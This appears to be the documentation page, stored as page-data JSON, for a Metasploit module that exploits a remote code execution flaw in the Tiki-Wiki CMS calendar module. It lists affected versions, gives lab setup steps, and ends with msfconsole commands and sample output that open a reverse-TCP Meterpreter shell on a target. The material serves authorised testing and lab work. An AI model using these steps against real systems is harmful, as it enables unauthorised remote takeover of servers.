{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/tiki_calendar_exec","result":{"data":{"moduleMetadataJson":{"id":"33d01423-6300-541f-b5c6-ec91b702dc07","name":"Tiki-Wiki CMS Calendar Command Execution","fullname":"exploit/linux/http/tiki_calendar_exec","description":"Tiki-Wiki CMS's calendar module contains a remote code execution\n          vulnerability within the viewmode GET parameter.\n          The calendar module is NOT enabled by default.  If enabled,\n          the default permissions are set to NOT allow anonymous users\n          to access.\n\n          Vulnerable versions: <=14.1, <=12.4 LTS, <=9.10 LTS and <=6.14\n          Verified/Tested against 14.1","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/tiki_calendar_exec","documentationSlug":"/modules/documentation/exploit/linux/http/tiki_calendar_exec","referencesSlug":"/modules/references/exploit/linux/http/tiki_calendar_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<ul>\n<li>Official Source: <a href=\"https://sourceforge.net/projects/tikiwiki/files/Tiki_14.x_Peony/14.1/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">sourceforge</a></li>\n<li>Exploit-db: <a href=\"https://www.exploit-db.com/apps/2fa84367ba4f14afab9f51cd3e93606d-tiki-14.2.7z\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">edb</a></li>\n<li>Archived Copy: <a href=\"https://github.com/h00die/MSF-Testing-Scripts\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github</a></li>\n</ul>\n<p>  <strong>Of note, there is some discussion if 14.2 is vuln or not.</strong></p>\n<ol>\n<li>Exploit-DB says in the title (may be wrong) 14.2 is vuln.</li>\n<li>The linked app Exploit-DB has is 14.2.</li>\n<li>Its verified on Exploit-DB.</li>\n</ol>\n<p>vs</p>\n<ol>\n<li>Manual print statement testing from the PoC on 14.2 doesn't seem to be vuln</li>\n<li>The <a href=\"https://tiki.org/article414-Important-Security-Fix-for-all-versions-of-Tiki\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">notice</a> seems to say 14.2 is the update that fixes the problem</li>\n</ol>\n<h3 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h3>\n<ol>\n<li>Create a fresh Ubuntu 16.04 w/ a LAMP install</li>\n<li><code class=\"language-text\">apt-get install php-xml</code></li>\n<li>Normal php install at that point!</li>\n<li>After install, login as admin:admin</li>\n<li>Go to the Control Panels</li>\n<li>Click Features</li>\n<li>Enable Calendar under Main feature</li>\n<li>Click Apply</li>\n</ol>\n<h4 id=\"permissions\" style=\"position:relative;\"><a href=\"#permissions\" aria-label=\"permissions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Permissions</h4>\n<p>  If you wish to enable the non-logged in user (anonymous) to view/exploit the calendar:</p>\n<ol>\n<li>Log in as admin</li>\n<li>From the top dropdown select permissions</li>\n<li>Check Anonymous near the top</li>\n<li>Click Assign</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the software as documented above</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/tiki_calendar_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost 10.10.10.10</code></li>\n<li>(optional, if not set, set username to empty) Do: <code class=\"language-text\">set PASSWORD admin</code></li>\n<li>Do: <code class=\"language-text\">set payload php/bind_perl</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  [*] Attempting Login\n  [+] Login Successful!\n  [+] 10.10.10.10:80 The target is vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<ol start=\"9\">\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  [*] Started reverse TCP handler on 10.10.10.10:4444 \n  [*] Attempting Login\n  [+] Login Successful!\n  [*] Sending malicious calendar view packet\n  [*] Sending stage (33721 bytes) 10.10.10.10.190\n  [*] Meterpreter session 1 opened (10.10.10.10:4444 -&gt; 192.168.2.190:48188) at 2016-06-19 08:50:44 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>PASSWORD</strong></p>\n<p>  Password is set at first login. Default for admin is 'admin'.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Example running against unauthenticated calendar v14.1</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf &gt; use exploit/linux/http/tiki_calendar_exec\n  msf exploit(tiki_calendar_exec) &gt; set rhost 192.168.2.190\n  rhost =&gt; 192.168.2.190\n  msf exploit(tiki_calendar_exec) &gt; set targeturi /t14_1/\n  targeturi =&gt; /t14_1/\n  msf exploit(tiki_calendar_exec) &gt; set payload php/meterpreter/reverse_tcp\n  payload =&gt; php/meterpreter/reverse_tcp\n  msf exploit(tiki_calendar_exec) &gt; set lhost 192.168.2.229\n  lhost =&gt; 192.168.2.229\n  msf exploit(tiki_calendar_exec) &gt; set verbose true\n  verbose =&gt; true\n  msf exploit(tiki_calendar_exec) &gt; set username &#39;&#39;\n  username =&gt; \n  msf exploit(tiki_calendar_exec) &gt; exploit\n  \n  [*] Started reverse TCP handler on 192.168.2.229:4444 \n  [*] Sending malicious calendar view packet\n  [*] Sending stage (33721 bytes) to 192.168.2.190\n  [*] Meterpreter session 1 opened (192.168.2.229:4444 -&gt; 192.168.2.190:48172) at 2016-06-18 10:58:19 -0400\n  \n  meterpreter &gt; sysinfo\n  Computer    : tikiwiki\n  OS          : Linux tikiwiki 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64\n  Meterpreter : php/php\n  meterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"33d01423-6300-541f-b5c6-ec91b702dc07"}}}